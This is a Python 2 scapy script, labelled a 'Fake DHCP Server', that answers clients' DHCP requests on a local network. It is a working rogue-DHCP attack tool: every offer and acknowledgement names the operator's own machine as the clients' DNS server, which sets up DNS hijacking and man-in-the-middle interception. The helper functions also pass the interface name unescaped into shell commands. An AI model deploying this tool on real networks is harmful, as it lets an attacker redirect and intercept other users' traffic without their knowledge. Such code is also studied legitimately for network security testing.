#!/usr/bin/python

'''
Author: Dao Xuan Hung
17/08/2018 15:47
Work well with scapy-2.3.2

'''


from scapy.all import *
import string, binascii, signal, sys, threading, socket, datetime, os
import random

def unpackMAC(binmac):
    # from DHCPPig
    mac = binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)

def seconds_diff(dt2, dt1):
    # https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
    timedelta = dt2 - dt1
    return timedelta.days * 24 * 3600 + timedelta.seconds

def getInterfaceIPAddress(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "inet addr" | cut -d: -f2 | cut -d" " -f1')
    return f.read().strip()

def getInterfaceMask(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "inet addr" | cut -d: -f4 | cut -d" " -f1')
    return f.read().strip()

def getInterfaceBroadcast(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "inet addr" | cut -d: -f3 | cut -d" " -f1')
    return f.read().strip()

def getInterfaceGateway(iface):
    f = os.popen('ip route | grep default | grep ' + iface + ' | cut -d" " -f3')
    return f.read().strip()

def getInterfaceMAC(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "HWaddr" | cut -d" " -f11')
    return f.read().strip()

class DHCPServer(threading.Thread):
    def __init__(self, iface, myMAC, myIP, gwIP, dnsIP, netmask, broadcast, domain):
        super(DHCPServer, self).__init__()
        self.iface = iface
        self.myMAC = myMAC
        self.myIP = myIP
        self.gwIP = gwIP
        self.dnsIP = dnsIP
        self.netmask = netmask
        self.broadcast = broadcast
        self.domain = domain
        self.offered = {myIP: ('null', 'null', 'null'), gwIP: ('null', 'null', 'null'), dnsIP: ('null', 'null', 'null')}
        self.socket = None
        self.daemon = True
        self.stop_sniffer = threading.Event()
        data = myIP.split('.')
        self.myNet = data[0] + '.' + data[1] + '.' + data[2] + '.'

    def run(self):
        filter_options = 'udp and src port 68 and dst port 67'

        self.socket = conf.L2listen(
                                    type = ETH_P_ALL,
                                    iface = self.iface,
                                    filter = filter_options
                                    )
        
        sniff(opened_socket = self.socket, prn=self.ProcessPacket, stop_filter=self.should_stop_sniffer)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.socket.close() # this socket must be closed to stop sniffer
        super(DHCPServer, self).join(timeout)

    def ProcessPacket(self, packet):
        if (DHCP in packet):
            if (packet[DHCP] and packet[DHCP].options[0][1] == 1): # if DHCP Discover
                client_mac = unpackMAC(packet[BOOTP].chaddr)
                tranid = packet[BOOTP].xid
                hostname = ''
                for option in packet[DHCP].options:
                    if (option[0] == 'hostname'):
                        hostname = option[1]

                self.Offer(client_mac, tranid, hostname)

            if (packet[DHCP] and packet[DHCP].options[0][1] == 3): # if DHCP Request
                client_mac = unpackMAC(packet[BOOTP].chaddr)
                tranid = packet[BOOTP].xid
                hostname = ''
                client_ip = ''
                for option in packet[DHCP].options:
                    if (option[0] == 'hostname'):
                        hostname = option[1]
                    if (option[0] == 'requested_addr'):
                        client_ip = option[1]

                self.Ack(client_ip, client_mac, tranid, hostname)

    def Offer(self, client_mac, tranid, hostname):
        client_ip = ''

        for i in range (1, 255, 1):
            if (self.myNet + str(i) not in self.offered):
                client_ip = self.myNet + str(i)
                break
            
        if (client_ip == ''):
            print "IP Address exhausted"
            return

        print "Offer IP Address: " + client_ip
        self.offered[client_ip] = (client_mac, hostname, tranid, datetime.datetime.now())

        frame       = Ether(dst = client_mac)
        ippacket    = IP(src = self.myIP, dst = client_ip)
        udppacket   = UDP(sport = 67, dport = 68)
        bootp       = BOOTP(op = 'BOOTREPLY',
                            xid = tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(client_mac),
                            yiaddr = client_ip)

        myoptions   = [ ('message-type', 'offer'),
                        ('server_id', self.myIP),
                        ('lease_time', 7200),
                        ('subnet_mask', self.netmask),
                        ('router', self.gwIP),
                        ('name_server', self.myIP),
                        ('domain', self.domain),
                        ('broadcast_address', self.broadcast),
                        ('end') ]

        dhcpoffer = DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpoffer

        sendp(packet, iface=self.iface, verbose=False)


    def Ack(self, client_ip, client_mac, tranid, hostname):

        print "Client got IP Address: " + client_ip
        self.offered[client_ip] = (client_mac, hostname, tranid, datetime.datetime.now())

        frame       = Ether(dst = client_mac)
        ippacket    = IP(src = self.myIP, dst = client_ip)
        udppacket   = UDP(sport = 67, dport = 68)
        bootp       = BOOTP(op = 'BOOTREPLY',
                            xid = tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(client_mac),
                            yiaddr = client_ip)

        myoptions   = [ ('message-type', 'ack'),
                        ('server_id', self.myIP),
                        ('lease_time', 7200),
                        ('subnet_mask', self.netmask),
                        ('router', self.gwIP),
                        ('name_server', self.myIP),
                        ('domain', self.domain),
                        ('broadcast_address', self.broadcast),
                        ('end') ]

        dhcpack = DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpack

        sendp(packet, iface=self.iface, verbose=False)



def DHCPServerStart(iface, myMAC, myIP, gwIP, netmask, broadcast, domain):
    print "Fake DHCP Server Start"
    server = DHCPServer(iface, myMAC, myIP, gwIP, myIP, netmask, broadcast, domain)
    server.start()


iface = 'eth0'
myMAC = getInterfaceMAC(iface)
myIP = getInterfaceIPAddress(iface)
gwIP = getInterfaceGateway(iface)
netmask = getInterfaceMask(iface)
broadcast = getInterfaceBroadcast(iface)
domain = 'localnet'

DHCPServerStart(iface, myMAC, myIP, gwIP, netmask, broadcast, domain)

while True:
    time.sleep(0.1)

exit()





# another way
# https://gist.github.com/yosshy/4551b1fe3d9af63b02d4
'''from scapy.all import DHCP_am
from scapy.base_classes import Net

dhcp_server = DHCP_am(iface='eth1', domain='example.com',
                      pool=Net('192.168.10.0/24'),
                      network='192.168.10.0/24',
                      gw='192.168.10.254',
                      renewal_time=600, lease_time=3600)
dhcp_server()'''